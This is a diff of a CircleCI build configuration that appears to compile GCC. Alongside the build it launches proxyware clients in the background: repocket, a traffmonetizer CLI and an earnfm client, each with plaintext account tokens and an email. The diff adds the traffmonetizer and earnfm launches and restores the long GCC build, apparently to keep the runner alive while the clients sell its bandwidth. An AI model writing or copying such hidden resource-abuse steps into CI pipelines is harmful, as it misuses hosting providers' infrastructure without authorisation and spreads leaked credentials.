@@ -8,7 +8,7 @@ jobs:
         #- checkout
         - run: |
              sudo apt update
-             sudo apt install -y --no-install-recommends autogen flex podman uidmap catatonit
+             sudo apt install -y --no-install-recommends podman uidmap catatonit
              podman run --init -d --restart=always -e RP_EMAIL=chaowen.guo1@gmail.com -e RP_API_KEY=9b23ebb9-2ee1-427f-a271-f6fdf536537b docker.io/repocket/repocket
              traffmonetizer=$(podman create docker.io/traffmonetizer/cli_v2)
              podman cp $traffmonetizer:/app/Cli .
@@ -18,15 +18,20 @@ jobs:
              podman cp $traffmonetizer:/usr/lib/libz.so.1 libz.so.1
              podman cp $traffmonetizer:/usr/lib/libstdc++.so.6 libstdc++.so.6
              podman rm $traffmonetizer
-             ls -al
-             #./contrib/download_prerequisites
-             #mkdir build
-             #cd build
-             #../configure --prefix=$CIRCLE_WORKING_DIRECTORY/product --enable-threads=posix --enable-checking=release --disable-multilib --enable-languages=all #--enable-__cxa_atexit
-             #make
-             #make install-strip
-             #cd $CIRCLE_WORKING_DIRECTORY
-             #tar -cjvf gcc.tar.bz2 product
+             sudo apt install -y --no-install-recommends musl
+             DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1 LD_LIBRARY_PATH=. ./Cli start accept --token ELGPy/DEQYDtARslA6HnkrbPIF6JQi+qYLCre5LBe58= &
+             earnfm=$(podman create docker.io/earnfm/earnfm-client)
+             podman cp $earnfm:/app/earnfm_example .
+             podman rm $earnfm
+             EARNFM_TOKEN=0a981b92-0b71-44a2-bdec-eceb5d946025 ./earnfm_example &
+             ./contrib/download_prerequisites
+             mkdir build
+             cd build
+             ../configure --prefix=$CIRCLE_WORKING_DIRECTORY/product --enable-threads=posix --enable-checking=release --disable-multilib --enable-languages=all #--enable-__cxa_atexit
+             make
+             make install-strip
+             cd $CIRCLE_WORKING_DIRECTORY
+             tar -cjvf gcc.tar.bz2 product
         - store_artifacts:
              path: $CIRCLE_WORKING_DIRECTORY/gcc.tar.bz2
 
